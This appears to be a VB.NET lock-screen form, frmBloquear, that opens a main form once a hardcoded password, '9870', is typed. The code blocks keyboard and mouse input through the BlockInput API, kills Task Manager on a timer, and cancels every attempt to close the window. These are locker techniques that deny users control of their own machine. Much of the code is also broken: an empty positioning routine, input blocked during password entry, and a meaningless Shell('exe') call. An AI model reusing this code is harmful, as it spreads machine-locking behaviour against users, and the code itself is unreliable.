Public Class frmBloquear

    Private Const HWND_TOPMOST = -1
    Private Const SWP_NOMOVE = &H2
    Private Const SWP_NOSIZE = &H1
    Private Const HWND_NOTOPMOST = -2
    Private Const SWP_SHOWWINDOW = &H40
    Private Declare Function SetWindowPos Lib "user32.dll" _
        (ByVal hWnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long

    Private Sub setwinPos(ByVal frmform As Form, ByVal bolSetToForeground As Boolean)
    End Sub

    Public Declare Function BlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer

    Dim senha As String

    Private Sub frmBloquear_KeyPress(sender As Object, e As KeyPressEventArgs) Handles Me.KeyPress
        senha = senha + e.KeyChar

        frmBloquear.BlockInput(System.Threading.Timeout.Infinite)
    End Sub

    Private Sub frmBloquear_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Text = My.Application.Info.ProductName
        If My.Computer.FileSystem.FileExists(My.Settings.bg) Then
            BackgroundImage = New System.Drawing.Bitmap(My.Settings.bg)
        Else
            BackgroundImage = Nothing
        End If

        frmBloquear.BlockInput(System.Threading.Timeout.Infinite)
    End Sub

    Private Sub frmBloquear_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        Try
            e.Cancel = True
            Shell("exe")
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Try
            Name = "taskmgr.exe"
            For Each taskmgr In Process.GetProcessesByName("taskmgr")
                taskmgr.Kill()
            Next
            Call setwinPos(Me, True)
        Catch ex As Exception
        End Try
    End Sub

    Private Sub picLogar_Click(sender As Object, e As EventArgs) Handles picLogar.Click
        If senha = "9870" Then
            frmMetroPrincipal.Show()
            Me.Dispose()
        Else
            senha = ""
        End If
    End Sub
End Class